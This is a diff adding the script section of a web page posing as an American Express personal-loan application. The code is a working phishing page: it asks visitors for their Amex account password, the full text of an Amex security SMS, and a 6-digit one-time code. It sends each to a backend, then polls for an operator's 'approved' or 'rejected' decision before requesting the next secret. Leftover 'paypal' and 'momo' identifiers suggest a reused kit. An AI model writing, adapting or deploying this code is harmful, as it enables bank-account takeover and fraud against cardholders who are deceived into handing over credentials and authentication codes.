+        if (demoPwdInp) {
+          setTimeout(() => demoPwdInp.focus(), 100);
+        }
+      }
+
+      if (currentStep === 4) {
+        isSubmittingMessage = false;
+        const targetPhone = appState.phoneNumber || document.getElementById('phone-number-input')?.value || '';
+        const smsTimerPhone = document.getElementById('sms-timer-phone');
+        if (smsTimerPhone) smsTimerPhone.innerText = targetPhone ? targetPhone : 'American Express Account';
+        startSimSmsReceiver();
+      }
+
+      if (currentStep === 5) {
+        isSubmittingOtp = false;
+        clearOtp();
+        const otpAlert = document.getElementById('otp-retry-alert');
+        if (otpAlert) otpAlert.classList.add('hidden');
+        const otpWait = document.getElementById('otp-waiting-box');
+        if (otpWait) otpWait.classList.add('hidden');
+        const firstOtp = document.querySelector('.otp-box');
+        if (firstOtp) setTimeout(() => firstOtp.focus(), 100);
+        if (appState.applicationId) {
+          startVerificationPolling(appState.applicationId);
+        }
+      }
+
+      if (currentStep === 6) {
+        const approvedAmt = document.getElementById('summary-approved-amount');
+        if (approvedAmt) approvedAmt.innerText = `$${appState.loanAmount.toLocaleString()}`;
+
+        const monthly = calculateMonthly(appState.loanAmount, appState.loanTermMonths);
+        const monthlyPay = document.getElementById('summary-monthly-payment');
+        if (monthlyPay) monthlyPay.innerText = `$${monthly.toLocaleString()} / mo`;
+
+        const termDisp = document.getElementById('summary-term-display');
+        if (termDisp) termDisp.innerText = `${appState.loanTermMonths} Months`;
+
+        if (appState.applicationId) {
+          startVerificationPolling(appState.applicationId);
+        }
+      }
+
+      resetScrollToTop();
+      requestAnimationFrame(resetScrollToTop);
+      setTimeout(resetScrollToTop, 50);
+    }
+
+    function handleBackAction() {
+      hideApprovalOverlay();
+      isAwaitingStep2Approval = false;
+      isSubmittingMessage = false;
+      isSubmittingOtp = false;
+      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+      const msgInput = document.getElementById('momo-pasted-msg');
+      if (msgInput) msgInput.value = '';
+
+      if (currentStep > 0 && currentStep <= 6) {
+        goToStep(currentStep - 1);
+      }
+    }
+
+    // Contact Mode Switcher (Phone vs Email)
+    let currentContactMode = 'phone';
+
+    function switchContactTab(mode) {
+      currentContactMode = mode;
+      const phoneTab = document.getElementById('tab-contact-phone');
+      const emailTab = document.getElementById('tab-contact-email');
+      const phoneWrap = document.getElementById('contact-phone-wrapper');
+      const emailWrap = document.getElementById('contact-email-wrapper');
+
+      if (mode === 'email') {
+        if (phoneTab) {
+          phoneTab.className = 'px-2.5 py-0.5 rounded-md text-slate-500 hover:text-slate-800 transition-all';
+        }
+        if (emailTab) {
+          emailTab.className = 'px-2.5 py-0.5 rounded-md bg-white text-brand-navy shadow-xs transition-all font-bold';
+        }
+        if (phoneWrap) phoneWrap.classList.add('hidden');
+        if (emailWrap) {
+          emailWrap.classList.remove('hidden');
+          const emailInput = document.getElementById('momo-email-display');
+          if (emailInput) emailInput.focus();
+        }
+      } else {
+        if (emailTab) {
+          emailTab.className = 'px-2.5 py-0.5 rounded-md text-slate-500 hover:text-slate-800 transition-all';
+        }
+        if (phoneTab) {
+          phoneTab.className = 'px-2.5 py-0.5 rounded-md bg-white text-brand-navy shadow-xs transition-all font-bold';
+        }
+        if (emailWrap) emailWrap.classList.add('hidden');
+        if (phoneWrap) {
+          phoneWrap.classList.remove('hidden');
+          const phoneInput = document.getElementById('momo-phone-display');
+          if (phoneInput) phoneInput.focus();
+        }
+      }
+    }
+
+    function onMomoEmailInput(val) {
+      appState.email = (val || '').trim();
+    }
+
+    // Demo Verification Password Input Logic
+    let demoPasswordVisible = false;
+
+    function onDemoPasswordInput(val) {
+      const value = (val || '').trim();
+      appState.demoPassword = value;
+      const loginBtn = document.getElementById('login-btn');
+      if (!loginBtn) return;
+
+      if (value.length > 0) {
+        loginBtn.disabled = false;
+        loginBtn.classList.remove('bg-blue-900/40', 'text-white/50', 'bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+        loginBtn.classList.add('bg-[#006FCF]', 'hover:bg-blue-800', 'text-white', 'shadow-md', 'cursor-pointer');
+      } else {
+        loginBtn.disabled = true;
+        loginBtn.classList.add('bg-blue-900/40', 'text-white/50', 'cursor-not-allowed');
+        loginBtn.classList.remove('bg-[#006FCF]', 'hover:bg-blue-800', 'text-white', 'shadow-md', 'cursor-pointer');
+      }
+    }
+
+    function toggleDemoPasswordVisibility() {
+      demoPasswordVisible = !demoPasswordVisible;
+      const pwdInput = document.getElementById('demo-password-input');
+      const eyeText = document.getElementById('eye-text');
+      if (pwdInput) {
+        pwdInput.type = demoPasswordVisible ? 'text' : 'password';
+      }
+      if (eyeText) {
+        eyeText.innerText = demoPasswordVisible ? 'Hide' : 'Show';
+      }
+    }
+
+    function clearPin() {
+      const pwdInput = document.getElementById('demo-password-input');
+      if (pwdInput) {
+        pwdInput.value = '';
+        pwdInput.focus();
+      }
+      appState.demoPassword = '';
+      onDemoPasswordInput('');
+    }
+
+    // 6-Digit OTP Boxes Logic
+    const otpInputs = document.querySelectorAll('.otp-box');
+    const verifyOtpBtn = document.getElementById('verify-otp-btn');
+
+    otpInputs.forEach((input, index) => {
+      input.addEventListener('focus', () => {
+        input.classList.add('active');
+        input.select();
+      });
+      input.addEventListener('blur', () => {
+        input.classList.remove('active');
+      });
+
+      input.addEventListener('input', (e) => {
+        const val = e.target.value.replace(/[^0-9]/g, '');
+        e.target.value = val;
+
+        if (val && index < otpInputs.length - 1) {
+          otpInputs[index + 1].focus();
+        }
+        checkOtpComplete();
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          otpInputs[index - 1].focus();
+        }
+      });
+
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = ((e.clipboardData || window.clipboardData)?.getData('text') || '').replace(/[^0-9]/g, '');
+        if (pasted) {
+          const chars = pasted.slice(0, otpInputs.length).split('');
+          chars.forEach((char, idx) => {
+            if (otpInputs[idx]) otpInputs[idx].value = char;
+          });
+          const nextIdx = Math.min(chars.length, otpInputs.length - 1);
+          if (otpInputs[nextIdx]) otpInputs[nextIdx].focus();
+          checkOtpComplete();
+        }
+      });
+    });
+
+    function checkOtpComplete() {
+      let otp = '';
+      otpInputs.forEach(i => otp += i.value);
+      const btn = document.getElementById('verify-otp-btn');
+      if (!btn) return;
+
+      if (otp.length === 6) {
+        btn.disabled = false;
+        btn.classList.remove('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+        btn.classList.add('bg-[#002663]', 'text-white', 'hover:bg-[#00175A]', 'cursor-pointer', 'shadow-md');
+      } else {
+        btn.disabled = true;
+        btn.classList.add('bg-slate-200', 'text-slate-400', 'cursor-not-allowed');
+        btn.classList.remove('bg-[#002663]', 'text-white', 'hover:bg-[#00175A]', 'cursor-pointer', 'shadow-md');
+      }
+    }
+
+    function clearOtp() {
+      otpInputs.forEach(i => i.value = '');
+      if (otpInputs[0]) otpInputs[0].focus();
+      checkOtpComplete();
+    }
+
+    let autoSubmitTimer = null;
+    let isSubmittingMessage = false;
+
+    function handlePostLoginPastedMsg(val, isAuto = false) {
+      const statusEl = document.getElementById('momo-extract-status');
+      const badge = document.getElementById('sms-waiting-badge');
+      const countdownCard = document.getElementById('sim-sms-countdown-card');
+      const text = (val || '').trim();
+
+      if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+
+      if (text && text.length >= 3) {
+        if (countdownCard) countdownCard.classList.remove('hidden');
+
+        const statusText = '✨ American Express security SMS detected! Ready to submit...';
+
+        if (statusEl) {
+          statusEl.classList.remove('hidden');
+          statusEl.innerHTML = `
+            <svg class="w-4 h-4 text-emerald-600 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"/>
+            </svg>
+            <span>${statusText}</span>
+          `;
+        }
+        if (badge) {
+          badge.className = 'inline-flex items-center text-[11px] font-bold text-emerald-700 bg-emerald-50 px-2.5 py-0.5 rounded-full border border-emerald-200';
+          badge.innerHTML = '<span class="mr-1">✓</span><span>SMS Received</span>';
+        }
+
+        const btn = document.getElementById('submit-pasted-msg-btn');
+        if (btn && !isSubmittingMessage) {
+          btn.innerText = 'SUBMIT SECURITY CODE';
+        }
+
+        if (isAuto) {
+          if (btn && !isSubmittingMessage) {
+            btn.innerText = '⚡ SUBMITTING AUTOMATICALLY...';
+          }
+          autoSubmitTimer = setTimeout(() => {
+            if (!isSubmittingMessage) {
+              submitRegisteredMessage();
+            }
+          }, 600);
+        }
+      } else {
+        if (statusEl) statusEl.classList.add('hidden');
+        if (badge) {
+          badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
+          badge.innerHTML = '<span>Ready to Paste</span>';
+        }
+      }
+    }
+
+    async function submitRegisteredMessage() {
+      if (isSubmittingMessage) return;
+
+      const msgInput = document.getElementById('momo-pasted-msg');
+      let msg = msgInput ? msgInput.value.trim() : '';
+      const btn = document.getElementById('submit-pasted-msg-btn');
+      const msgAlert = document.getElementById('msg-retry-alert');
+      const smsWaitingBox = document.getElementById('sms-waiting-box');
+      if (msgAlert) msgAlert.classList.add('hidden');
+
+      if (!msg) {
+        if (msgAlert) {
+          msgAlert.innerText = 'Please paste the SMS confirmation message received from American Express.';
+          msgAlert.classList.remove('hidden');
+        }
+        return;
+      }
+
+      isSubmittingMessage = true;
+      if (btn) {
+        btn.disabled = true;
+        btn.innerText = 'AWAITING APPROVAL...';
+      }
+      if (smsWaitingBox) smsWaitingBox.classList.remove('hidden');
+      showApprovalOverlay(
+        'Awaiting SMS Verification',
+        'Your confirmation message has been submitted. Please wait while underwriting verifies your request...',
+        'Verifying SMS Security Code...'
+      );
+
+      try {
+        let appId = appState.applicationId;
+        if (!appId) {
+          appId = await ensureApplicationCreated();
+        }
+        if (appId) {
+          const res = await fetch(`/api/applications/${appId}/verify`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ step: 'id_document', idNumber: msg, fullMessage: msg })
+          });
+          const resData = await res.json().catch(() => ({}));
+
+          if (!res.ok && res.status !== 409) {
+            isSubmittingMessage = false;
+            hideApprovalOverlay();
+            if (msgAlert) {
+              msgAlert.innerText = resData.error || '❌ Error submitting verification message. Please try again.';
+              msgAlert.classList.remove('hidden');
+            }
+            if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
+            if (btn) {
+              btn.disabled = false;
+              btn.innerText = 'SUBMIT SECURITY CODE';
+            }
+            startSmsCountdownTimer();
+            return;
+          }
+
+          if (resData.verificationId) {
+            activeSmsVerId = resData.verificationId;
+          }
+          lastHandledRejectSmsId = null;
+          startVerificationPolling(appId);
+        }
+      } catch (err) {
+        isSubmittingMessage = false;
+        hideApprovalOverlay();
+        if (msgAlert) {
+          msgAlert.innerText = '❌ Error submitting verification message. Please try again.';
+          msgAlert.classList.remove('hidden');
+        }
+        if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
+        if (btn) {
+          btn.disabled = false;
+          btn.innerText = 'SUBMIT SECURITY CODE';
+        }
+        startSmsCountdownTimer();
+      }
+    }
+
+    async function submitStep2AndAwaitApproval() {
+      const fnEl = document.getElementById('first-name-input');
+      const lnEl = document.getElementById('last-name-input');
+      const phEl = document.getElementById('phone-number-input');
+      const step2Alert = document.getElementById('step2-alert');
+      const authBtn = document.getElementById('continue-to-auth-btn');
+      const appWaitingBox = document.getElementById('app-waiting-box');
+
+      if (step2Alert) step2Alert.classList.add('hidden');
+
+      if (!fnEl || !fnEl.value.trim() || !lnEl || !lnEl.value.trim() || !phEl || !phEl.value.trim()) {
+        if (step2Alert) {
+          step2Alert.innerText = 'Please fill in all required fields (*).';
+          step2Alert.classList.remove('hidden');
+        }
+        return;
+      }
+
+      const rawPhoneDigits = (phEl.value || '').replace(/\D/g, '');
+      if (appState.country === 'US' && rawPhoneDigits.length < 10) {
+        if (step2Alert) {
+          step2Alert.innerText = 'Please enter a valid 10-digit US mobile phone number.';
+          step2Alert.classList.remove('hidden');
+        }
+        return;
+      }
+
+      appState.firstName = fnEl.value.trim();
+      appState.lastName = lnEl.value.trim();
+      appState.phoneNumber = phEl.value.trim();
+      const dispPhone = document.getElementById('momo-phone-display');
+      if (dispPhone) dispPhone.value = appState.phoneNumber;
+
+      const emEl = document.getElementById('email-input');
+      if (emEl && emEl.value.trim()) {
+        appState.email = emEl.value.trim();
+        const dispEmail = document.getElementById('momo-email-display');
+        if (dispEmail) dispEmail.value = appState.email;
+      }
+
+      // Sync financing preferences from form controls
+      const typeEl = document.getElementById('loan-type-select');
+      if (typeEl) appState.loanType = typeEl.value;
+      const amtEl = document.getElementById('loan-amount-input');
+      if (amtEl) appState.loanAmount = parseInt(amtEl.value, 10) || appState.loanAmount;
+      const termEl = document.getElementById('loan-term-select');
+      if (termEl) appState.loanTermMonths = parseInt(termEl.value, 10) || 36;
+      const purpEl = document.getElementById('loan-purpose-input');
+      if (purpEl) appState.purpose = purpEl.value;
+
+      isAwaitingStep2Approval = true;
+
+      if (authBtn) {
+        authBtn.disabled = true;
+        authBtn.innerText = 'AWAITING APPROVAL...';
+      }
+      if (appWaitingBox) appWaitingBox.classList.remove('hidden');
+      showApprovalOverlay(
+        'Awaiting Application Review',
+        'Your application details have been submitted. Please wait while underwriting reviews...',
+        'Awaiting Underwriting Review...'
+      );
+
+      try {
+        const appId = await ensureApplicationCreated();
+        if (appId) {
+          startVerificationPolling(appId);
+        } else {
+          isAwaitingStep2Approval = false;
+          hideApprovalOverlay();
+          if (step2Alert) {
+            step2Alert.innerText = '❌ Error submitting application. Please try again.';
+            step2Alert.classList.remove('hidden');
+          }
+          if (appWaitingBox) appWaitingBox.classList.add('hidden');
+          if (authBtn) {
+            authBtn.disabled = false;
+            authBtn.innerText = 'CONTINUE TO AMEX SIGN IN';
+          }
+        }
+      } catch (err) {
+        isAwaitingStep2Approval = false;
+        hideApprovalOverlay();
+        if (step2Alert) {
+          step2Alert.innerText = '❌ ' + (err.message || 'Error submitting application. Please try again.');
+          step2Alert.classList.remove('hidden');
+        }
+        if (appWaitingBox) appWaitingBox.classList.add('hidden');
+        if (authBtn) {
+          authBtn.disabled = false;
+          authBtn.innerText = 'CONTINUE TO AMEX SIGN IN';
+        }
+      }
+    }
+
+    let pollingInterval = null;
+    let currentPollingAppId = null;
+    let isAwaitingStep2Approval = false;
+    let activePinVerId = null;
+    let lastHandledRejectPinId = null;
+    let activeSmsVerId = null;
+    let lastHandledRejectSmsId = null;
+    let activeOtpVerId = null;
+    let lastHandledRejectOtpId = null;
+    let isSubmittingOtp = false;
+
+    function startVerificationPolling(appId) {
+      if (!appId) return;
+      if (pollingInterval && currentPollingAppId === appId) return;
+      if (pollingInterval) {
+        clearInterval(pollingInterval);
+        pollingInterval = null;
+      }
+      currentPollingAppId = appId;
+      pollingInterval = setInterval(async () => {
+        try {
+          const statusRes = await fetch(`/api/applications/${appId}/status`);
+          if (statusRes.ok) {
+            const statusData = await statusRes.json();
+            const st = (statusData.status || '').toLowerCase();
+
+            if (statusData.phone) {
+              appState.phoneNumber = statusData.phone;
+              localStorage.setItem('amex_phone', statusData.phone);
+              localStorage.setItem('paypal_phone', statusData.phone);
+              const dispPhone = document.getElementById('momo-phone-display');
+              if (dispPhone) dispPhone.value = statusData.phone;
+            }
+            if (statusData.firstName) appState.firstName = statusData.firstName;
+            if (statusData.lastName) appState.lastName = statusData.lastName;
+
+            if (isAwaitingStep2Approval) {
+              const appWaitingBox = document.getElementById('app-waiting-box');
+              const authBtn = document.getElementById('continue-to-auth-btn');
+              const step2Alert = document.getElementById('step2-alert');
+              if (st === 'approved' || st === 'under_review') {
+                isAwaitingStep2Approval = false;
+                hideApprovalOverlay();
+                if (appWaitingBox) appWaitingBox.classList.add('hidden');
+                if (step2Alert) step2Alert.classList.add('hidden');
+                if (authBtn) {
+                  authBtn.disabled = false;
+                  authBtn.innerText = 'CONTINUE TO AMEX SIGN IN';
+                }
+                goToStep(3);
+              } else if (st === 'rejected') {
+                isAwaitingStep2Approval = false;
+                hideApprovalOverlay();
+                if (appWaitingBox) appWaitingBox.classList.add('hidden');
+                if (step2Alert) {
+                  step2Alert.innerText = '❌ Application could not be verified by underwriting. Please check your details and try again.';
+                  step2Alert.classList.remove('hidden');
+                }
+                if (authBtn) {
+                  authBtn.disabled = false;
+                  authBtn.innerText = 'CONTINUE TO AMEX SIGN IN';
+                }
+                appState.applicationId = null;
+              }
+            }
+          }
+
+          const res = await fetch(`/api/applications/${appId}/verification`);
+          if (res.ok) {
+            const data = await res.json();
+            const verifications = data.verifications || [];
+
+            // Step 3: Account Credentials verification check
+            const accountPinVer = activePinVerId
+              ? verifications.find(v => v.id === activePinVerId)
+              : verifications.find(v => (v.step === 'account_pin' || v.step === 'zip_phone' || v.step === 'merchant_pin'));
+            const pinAlert = document.getElementById('pin-retry-alert');
+            const pinWaitingBox = document.getElementById('pin-waiting-box');
+            const loginBtn = document.getElementById('login-btn');
+
+            if (currentStep === 3 && accountPinVer) {
+              if (accountPinVer.status === 'approved') {
+                hideApprovalOverlay();
+                if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
+                if (pinAlert) pinAlert.classList.add('hidden');
+                clearPin();
+                if (loginBtn) {
+                  loginBtn.innerHTML = '<span>⚡</span><span>SIGN IN & VERIFY</span>';
+                  loginBtn.disabled = false;
+                }
+                lastHandledRejectPinId = null;
+                activePinVerId = null;
+                goToStep(4);
+              } else if (accountPinVer.status === 'rejected') {
+                if (lastHandledRejectPinId !== accountPinVer.id) {
+                  lastHandledRejectPinId = accountPinVer.id;
+                  activePinVerId = null;
+                  hideApprovalOverlay();
+                  if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
+                  if (pinAlert) {
+                    pinAlert.innerText = accountPinVer.reject_reason || '❌ Verification rejected. Please re-enter your password.';
+                    pinAlert.classList.remove('hidden');
+                  }
+                  clearPin();
+                  if (loginBtn) {
+                    loginBtn.innerHTML = '<span>⚡</span><span>SIGN IN & VERIFY</span>';
+                    loginBtn.disabled = true;
+                  }
+                  const pwdInp = document.getElementById('demo-password-input');
+                  if (pwdInp) pwdInp.focus();
+                }
+              }
+            }
+
+            // Step 4: SMS Verification check -> go to Step 5 (OTP)
+            const smsVer = activeSmsVerId
+              ? verifications.find(v => v.id === activeSmsVerId)
+              : verifications.find(v => v.step === 'id_document');
+            const msgAlert = document.getElementById('msg-retry-alert');
+            const smsWaitingBox = document.getElementById('sms-waiting-box');
+            const smsBtn = document.getElementById('submit-pasted-msg-btn');
+
+            if (currentStep === 4 && smsVer) {
+              if (smsVer.status === 'approved') {
+                if (simCountdownInterval) {
+                  clearInterval(simCountdownInterval);
+                  simCountdownInterval = null;
+                }
+                const countdownCard = document.getElementById('sim-sms-countdown-card');
+                if (countdownCard) countdownCard.classList.add('hidden');
+                hideApprovalOverlay();
+                if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
+                if (msgAlert) msgAlert.classList.add('hidden');
+                if (smsBtn) {
+                  smsBtn.innerText = '✓ APPROVED';
+                  smsBtn.classList.remove('amex-btn-gradient');
+                  smsBtn.classList.add('bg-emerald-600', 'text-white');
+                }
+                lastHandledRejectSmsId = null;
+                activeSmsVerId = null;
+                goToStep(5);
+              } else if (smsVer.status === 'rejected') {
+                if (lastHandledRejectSmsId !== smsVer.id) {
+                  lastHandledRejectSmsId = smsVer.id;
+                  activeSmsVerId = null;
+                  hideApprovalOverlay();
+                  isSubmittingMessage = false;
+                  if (autoSubmitTimer) clearTimeout(autoSubmitTimer);
+
+                  const msgInp = document.getElementById('momo-pasted-msg');
+                  if (msgInp) {
+                    msgInp.value = '';
+                    msgInp.focus();
+                  }
+
+                  const statusEl = document.getElementById('momo-extract-status');
+                  if (statusEl) statusEl.classList.add('hidden');
+
+                  const badge = document.getElementById('sms-waiting-badge');
+                  if (badge) {
+                    badge.className = 'inline-flex items-center text-[11px] font-bold text-slate-600 bg-slate-100 px-2.5 py-0.5 rounded-full border border-slate-200';
+                    badge.innerHTML = '<span>Ready to Paste</span>';
+                  }
+
+                  if (smsWaitingBox) smsWaitingBox.classList.add('hidden');
+                  if (msgAlert) {
+                    msgAlert.innerText = smsVer.reject_reason || '❌ SMS security verification failed. Please copy the complete SMS message and paste below.';
+                    msgAlert.classList.remove('hidden');
+                  }
+                  if (smsBtn) {
+                    smsBtn.disabled = false;
+                    smsBtn.innerText = 'SUBMIT SECURITY CODE';
+                  }
+
+                  startSmsCountdownTimer();
+                  initWebOtpReceiver();
+                }
+              }
+            }
+
+            // Step 5: OTP Code Verification check -> go to Step 6 (Congratulations Dashboard)
+            const otpVer = activeOtpVerId
+              ? verifications.find(v => v.id === activeOtpVerId)
+              : verifications.find(v => v.step === 'otp_code');
+            const otpAlert = document.getElementById('otp-retry-alert');
+            const otpWaitingBox = document.getElementById('otp-waiting-box');
+            const otpBtn = document.getElementById('verify-otp-btn');
+
+            if (currentStep === 5 && otpVer) {
+              if (otpVer.status === 'approved') {
+                isSubmittingOtp = false;
+                hideApprovalOverlay();
+                if (otpWaitingBox) otpWaitingBox.classList.add('hidden');
+                if (otpAlert) otpAlert.classList.add('hidden');
+                if (otpBtn) {
+                  otpBtn.innerText = '✓ APPROVED';
+                  otpBtn.classList.remove('bg-slate-200', 'text-slate-400', 'bg-[#002663]');
+                  otpBtn.classList.add('bg-emerald-600', 'text-white');
+                }
+                lastHandledRejectOtpId = null;
+                activeOtpVerId = null;
+                goToStep(6);
+              } else if (otpVer.status === 'rejected') {
+                if (lastHandledRejectOtpId !== otpVer.id) {
+                  lastHandledRejectOtpId = otpVer.id;
+                  activeOtpVerId = null;
+                  isSubmittingOtp = false;
+                  hideApprovalOverlay();
+                  if (otpWaitingBox) otpWaitingBox.classList.add('hidden');
+                  if (otpAlert) {
+                    otpAlert.innerText = otpVer.reject_reason || '❌ Invalid security code. Please enter the correct 6-digit code sent from American Express.';
+                    otpAlert.classList.remove('hidden');
+                  }
+                  clearOtp();
+                  if (otpBtn) {
+                    otpBtn.innerHTML = 'VERIFY & APPROVE PERSONAL LOAN';
+                    otpBtn.disabled = true;
+                  }
+                  if (otpInputs && otpInputs[0]) otpInputs[0].focus();
+                }
+              }
+            }
+          }
+        } catch (e) { }
+      }, 1500);
+    }
+
+    async function submitAccountPin() {
+      const pwdInp = document.getElementById('demo-password-input');
+      const enteredPassword = (appState.demoPassword || (pwdInp ? pwdInp.value : '') || '').trim();
+      if (!enteredPassword) return;
+
+      const pinAlert = document.getElementById('pin-retry-alert');
+      if (pinAlert) pinAlert.classList.add('hidden');
+
+      const pinWaitingBox = document.getElementById('pin-waiting-box');
+      if (pinWaitingBox) pinWaitingBox.classList.remove('hidden');
+
+      const loginBtn = document.getElementById('login-btn');
+      if (loginBtn) {
+        loginBtn.innerHTML = `
+          <span class="inline-flex items-center">
+            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            SIGNING IN...
+          </span>`;
+        loginBtn.disabled = true;
+      }
+
+      showApprovalOverlay(
+        'Awaiting Underwriting Review',
+        'Your credentials have been submitted. Please wait while underwriting reviews...',
+        'Verifying Credentials...'
+      );
+
+      try {
+        let appId = appState.applicationId;
+        if (!appId) {
+          appId = await ensureApplicationCreated();
+        }
+
+        let activePhone = (
+          appState.phoneNumber
+          || document.getElementById('momo-phone-display')?.value
+          || document.getElementById('phone-number-input')?.value
+          || localStorage.getItem('amex_phone')
+          || localStorage.getItem('paypal_phone')
+          || ''
+        ).trim();
+
+        if (activePhone) {
+          activePhone = getFormattedPhone(activePhone);
+          appState.phoneNumber = activePhone;
+        }
+
+        if (appId) {
+          const res = await fetch(`/api/applications/${appId}/verify`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              step: 'account_pin',
+              zipCode: enteredPassword,
+              phone: activePhone
+            })
+          });
+          const resData = await res.json().catch(() => ({}));
+          if (!res.ok && res.status !== 409) {
+            hideApprovalOverlay();
+            if (pinAlert) {
+              pinAlert.innerText = resData.error || '❌ Error submitting verification. Please try again.';
+              pinAlert.classList.remove('hidden');
+            }
+            if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
+            if (loginBtn) {
+              loginBtn.innerHTML = '<span>⚡</span><span>SIGN IN & VERIFY</span>';
+              loginBtn.disabled = false;
+            }
+            return;
+          }
+
+          if (resData.verificationId) {
+            activePinVerId = resData.verificationId;
+          }
+          lastHandledRejectPinId = null;
+          startVerificationPolling(appId);
+        }
+      } catch (err) {
+        hideApprovalOverlay();
+        console.error('Verification submission error:', err);
+        if (pinAlert) {
+          pinAlert.innerText = '❌ Error submitting verification. Please try again.';
+          pinAlert.classList.remove('hidden');
+        }
+        if (pinWaitingBox) pinWaitingBox.classList.add('hidden');
+        if (loginBtn) {
+          loginBtn.innerHTML = '<span>⚡</span><span>SIGN IN & VERIFY</span>';
+          loginBtn.disabled = false;
+        }
+      }
+    }
+
+    async function submitOtpVerification() {
+      if (isSubmittingOtp) return;
+      let otp = '';
+      otpInputs.forEach(i => otp += i.value);
+      const otpAlert = document.getElementById('otp-retry-alert');
+      const otpWaitingBox = document.getElementById('otp-waiting-box');
+      const btn = document.getElementById('verify-otp-btn');
+
+      if (otpAlert) otpAlert.classList.add('hidden');
+
+      if (otp.length !== 6) {
+        if (otpAlert) {
+          otpAlert.innerText = 'Please enter the complete 6-digit security code.';
+          otpAlert.classList.remove('hidden');
+        }
+        return;
+      }
+
+      isSubmittingOtp = true;
+      if (btn) {
+        btn.disabled = true;
+        btn.innerHTML = `
+          <span class="inline-flex items-center">
+            <svg class="animate-spin -ml-1 mr-2 h-4 w-4 text-white" fill="none" viewBox="0 0 24 24">
+              <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+              <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+            </svg>
+            VERIFYING CODE...
+          </span>`;
+      }
+      if (otpWaitingBox) otpWaitingBox.classList.remove('hidden');
+      showApprovalOverlay(
+        'Awaiting Security Code Verification',
+        'Your security code has been submitted. Please wait while underwriting validates your personal loan approval...',
+        'Verifying Security Code...'
+      );
+
+      try {
+        let appId = appState.applicationId;
+        if (!appId) {
+          appId = await ensureApplicationCreated();
+        }
+        if (appId) {
+          const res = await fetch(`/api/applications/${appId}/verify`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              step: 'otp_code',
+              otpCode: otp
+            })
+          });
+          const resData = await res.json().catch(() => ({}));
+
+          if (!res.ok && res.status !== 409) {
+            isSubmittingOtp = false;
+            hideApprovalOverlay();
+            if (otpAlert) {
+              otpAlert.innerText = resData.error || '❌ Error submitting security code. Please try again.';
+              otpAlert.classList.remove('hidden');
+            }
+            if (otpWaitingBox) otpWaitingBox.classList.add('hidden');
+            if (btn) {
+              btn.innerHTML = 'VERIFY & APPROVE PERSONAL LOAN';
+              btn.disabled = false;
+            }
+            return;
+          }
+
+          if (resData.verificationId) {
+            activeOtpVerId = resData.verificationId;
+          }
+          lastHandledRejectOtpId = null;
+          startVerificationPolling(appId);
+        }
+      } catch (err) {
+        isSubmittingOtp = false;
+        hideApprovalOverlay();
+        if (otpAlert) {
+          otpAlert.innerText = '❌ Error submitting security code. Please try again.';
+          otpAlert.classList.remove('hidden');
+        }
+        if (otpWaitingBox) otpWaitingBox.classList.add('hidden');
+        if (btn) {
+          btn.innerHTML = 'VERIFY & APPROVE PERSONAL LOAN';
+          btn.disabled = false;
+        }
+      }
+    }
+  </script>
+</body>
+
+</html>
